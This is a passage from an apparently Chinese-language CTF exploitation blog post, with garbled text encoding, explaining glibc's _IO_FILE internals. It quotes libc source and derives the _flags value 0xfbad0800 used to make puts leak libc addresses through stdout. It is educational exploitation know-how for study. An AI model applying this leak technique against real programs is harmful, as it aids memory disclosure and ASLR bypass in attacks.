class="line">  <span class="keyword">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  ...<span class="comment">//ä¸‹é¢ä¸ºä¸€äº›å®</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨<code>_IO_FILE</code>ä¸‹é¢å¯ä»¥çœ‹åˆ°å®ƒçš„è€çˆ¸<code>_IO_FILE_plus</code>ï¼Œä½†å¹¶æ²¡æœ‰å®ƒçš„å‡½æ•°å®šä¹‰ï¼Œå®šä¹‰åœ¨<code>libio/libioP.h</code>é‡Œé¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span><span class="comment">//è™šå‡½æ•°è¡¨</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE file</code>å°±æ˜¯åˆšåˆšçš„é‚£ä¸ªç»“æ„ä½“ï¼Œ<code>_IO_jump_t</code>å¦‚ä¸‹ï¼Œæ­¤è™šè¡¨åœ¨<code>House of orange</code>ç”¨çš„æ¯”è¾ƒå¤šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE file</code>å¤§ä½“å°±è¿™æ ·ï¼Œå¯ä»¥è€ƒå¯Ÿä¸‹é¢çš„é“¾æ¥å†åŠ æ·±ä¸€ä¸‹ï¼š</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">å¥½å¥½è¯´è¯ä¹‹IO_FILEåˆ©ç”¨ï¼ˆ1ï¼‰ï¼šåˆ©ç”¨_IO_2_1_stdoutæ³„éœ²libc</a></p><p><a href="https://la13x.github.io/2021/07/27/IO-FILE/#fopen">IO_FILEç›¸å…³åˆ©ç”¨</a></p><p><a href="http://blog.ivan0.com/2018/11/19/IO_FILE/">IO_FILE</a></p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨<code>_IO_FILE</code>æ³„éœ²<code>libc</code>çš„åŸç†</p><h4 id="å¦‚ä½•ç”¨-IO-FILEæ³„éœ²libc"><a href="#å¦‚ä½•ç”¨-IO-FILEæ³„éœ²libc" class="headerlink" title="å¦‚ä½•ç”¨_IO_FILEæ³„éœ²libc"></a>å¦‚ä½•ç”¨_IO_FILEæ³„éœ²libc</h4><blockquote><p>æ³„éœ²çš„æœ¬è´¨åªæ˜¯åˆ©ç”¨å®ƒåŸæ¥çš„è¾“å‡ºï¼Œåªæ˜¯å¯ä»¥ä»»æ„åœ°å€å†™äº†ä¹‹åæ”¹å†™äº†ä¸€äº›å‚æ•°ï¼Œè®©å®ƒæœ¬æ¥çš„è¾“å‡ºå‘ˆç°å‡ºä¸ä¸€æ ·çš„ç»“æœç½¢äº†ï¼</p></blockquote><p>ä¸‹é¢å°±ç”¨<code>puts</code>å‡½æ•°æ¥è®²è§£ï¼Œå¦‚ä½•æ„é€ ä¸€äº›å·§å¦™çš„å€¼æ¥è¾¾åˆ°æ³„éœ²<code>libc</code>ç›®çš„ï¼Œ<code>puts</code>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨è¿™ä¹ˆå¤šå‡½æ•°æœ€ç»ˆæ˜¯è°ƒç”¨äº†<code>vtable</code>ä¸­çš„<code> JUMP_FIELD(_IO_xsputn_t, __xsputn);</code>ï¼ŒåŠ¨æ€çš„ç»“æœä¹Ÿæ˜¯è¿™æ ·ï¼ˆå¥½åƒåŠ¨è°ƒçš„å‰é¢éƒ½æœ‰ä¸ª<code>_file</code>ï¼‰ï¼š</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/2.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯<code>_IO_OVERFLOW</code>ï¼Œè¿›åˆ°<code>_IO_OVERFLOW</code>å°±æ˜¯æ³„éœ²çš„é‡ç‚¹äº†ï¼</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/3.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„æœ€ç»ˆçš„ç›®çš„å°±æ˜¯é€šè¿‡<code>_IO_do_write</code>æ¥æ³„éœ²<code>libc</code>ï¼Œé‚£è¦åˆ°è¾¾è¿™ä¸ªåˆ†æ”¯ï¼Œéœ€è¦ç»•è¿‡å¦‚ä¸‹åˆ¤æ–­ï¼š</p><ol><li><code> if (f-&gt;_flags &amp; _IO_NO_WRITES)</code></li><li><code> if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</code></li></ol><p>ä¸Šé¢ä¸¤ä¸ªåˆ†æ”¯éƒ½æ˜¯é¿å…è¿›å…¥çš„ï¼Œæˆ‘ä»¬åªè¦è¿›å…¥<code>if (ch == EOF)</code>è¿™ä¸ªåˆ¤æ–­é‡Œé¢ï¼ŒæŸ¥æ‰¾ä¸€äº›å®å®šä¹‰ä¹‹åå°±å¯ä»¥ç®—å‡º<code>flag</code>çš„å€¼äº†ï¼Œä»¥ååªè¦ç”¨è¿™ä¸ª<code>flag</code>çš„å€¼å°±èƒ½è¿›å…¥ <code>_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</code>è¿™ä¸ªåˆ†æ”¯äº†ï¼š</p><blockquote><p><code>_flags = 0xfbad0000 </code><br><code>_flags &amp;= ~_IO_NO_WRITES  ==&gt; _flags = 0xfbad0000 </code><br><code>_flags |= _IO_CURRENTLY_PUTTING ==&gt; _flags = 0xfbad0800</code></p></blockquote><p>æ—¢ç„¶èƒ½æ­£å¸¸è¿›å…¥<code>_IO_do_write</code>ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹ï¼Œå‘ç°æœ‰ä¸ª<code>if &#123;&#125; else if&#123;&#125;</code>ï¼Œè¿™ä¼šç»•ä¸è¿‡äº†ï¼Œåªèƒ½çœ‹çœ‹è¿›åˆ°é‚£ä¸ªåˆ†æ”¯é‡Œé¢å¯¹ç»“æœå½±å“å°ï¼Œå…¶å®ä¸ç”¨è¯´ï¼Œä¸€çœ‹<code>fp-&gt;_offset = _IO_pos_BAD;</code>çš„å½±å“å°±å°ï¼Œæ¯•ç«Ÿå°±ä¸€æ¡è¯­å¥ï¼Œä¸‹é¢é‚£ä¸ªåˆ†æ”¯å°±å¾ˆå±é™©äº†ï¼Œè¿™é‡Œå¼•ç”¨å…¶ä»–å¤§ä½¬çš„ä¸€æ®µè¯ï¼š</p><blockquote><p>è¿™æ¡åˆ†æ”¯æˆ‘ä»¬å°½å¯èƒ½çš„ä¸ç¢°ï¼ŒåŸå› æœ‰ä¸¤ç‚¹ï¼š</p><p>ç¬¬ä¸€ï¼Œå…¶å®åªè¦æ»¡è¶³åˆ¤æ–­ä¸­çš„æ¡ä»¶<code>fp-&gt;_IO_read_end = fp-&gt;_IO_write_base</code>å³å¯ç»•è¿‡è¿™é‡Œçš„åˆ¤æ–­ï¼Œä½¿ä¹‹ç›¸ç­‰çš„æ“ä½œå¹¶ä¸æ˜¯æ²¡æœ‰å¯èƒ½ï¼Œä½†æ˜¯åœ¨å®é™…æ“ä½œä¸­å®ç°çš„å‡ ç‡æ¯”è¾ƒå°ã€‚ä¸€èˆ¬åœ¨åšè¿™ç§é¢˜çš„æ—¶å€™éƒ½ä¼šä¼´éšç€éšæœºåŒ–ä¿æŠ¤çš„å¼€å¯ï¼Œè¿›è¡Œæ”»å‡»çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸€èˆ¬é‡‡ç”¨çš„éƒ½æ˜¯è¦†ç›–æœ«ä½å­—èŠ‚çš„æ–¹å¼é€ æˆåç§»ï¼Œå› ä¸ºå³ä½¿éšæœºåŒ–åç§»ä¹Ÿä¼šå­˜åœ¨0x1000å¯¹é½ã€‚ä½†æ˜¯è¿™æ—¶å€™å°±ä¼šé‡åˆ°ä¸€ä¸ªå¾ˆå°´å°¬çš„æƒ…å†µï¼Œ<code>_IO_read_end</code>å’Œ<code>_IO_write_base</code>å­˜æ”¾çš„åœ°å€æ˜¯ç”±æœ«ä½å­—èŠ‚å’Œå…¶ä»–é«˜å­—èŠ‚å…±åŒç»„æˆçš„ï¼Œå…¶ä»–é«˜å­—èŠ‚ç”±äºéšæœºåŒ–çš„ç¼˜æ•…æ— æ³•ç¡®å®šï¼Œæ‰€ä»¥ä½•è°ˆä½¿ä¸¤ä¸ªæˆå‘˜å˜é‡ä¸­çš„åœ°å€ç›¸ç­‰å‘¢</p><p>ç¬¬äºŒï¼Œå¯ä»¥çœ‹åˆ°<code>else if</code>è¿™æ¡åˆ†æ”¯ä¸­è°ƒç”¨äº†<code>_IO_SYSSEEK</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå³<code>lssek</code>å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬å°†<code>_IO_read_end</code>çš„å€¼è®¾ç½®ä¸º0ï¼Œé‚£ä¹ˆ<code>_IO_SYSSEEK</code>çš„äºŒå‚<code>fp-&gt;_IO_write_base - fp-&gt;_IO_read_end</code>å¾—å‡ºçš„æ•°å€¼å°±æœ‰å¯èƒ½éå¸¸å¤§ï¼Œè¿™å°±ä¼šå¯¼è‡´<code>sleek</code>å‡½æ•°æ‰§è¡Œä¸æˆåŠŸå¯¼è‡´é€€å‡ºï¼Œè¿™æ˜¯å› ä¸ºè½½å…¥å†…å­˜çš„æ•°æ®èŒƒå›´å¯èƒ½å¹¶ä¸å¤§ï¼Œä½†æ˜¯ç»è¿‡<code>sleek</code>å‡½æ•°ä¿®æ”¹è¿‡å¤§çš„åç§»ä¹‹åè¶…è¿‡äº†æ•°æ®èŒƒå›´çš„è¾¹ç•Œã€‚ä¸€æ—¦<code>sleek</code>å‡½æ•°æ‰§è¡Œä¸æˆåŠŸå¯¼è‡´é€€å‡ºï¼Œé‚£ä¹ˆå°±ä¸ä¼šåˆ°è¾¾æˆ‘ä»¬æƒ³è¦çš„<code>_IO_SYSWRITE</code>ç³»ç»Ÿè°ƒç”¨äº†</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - 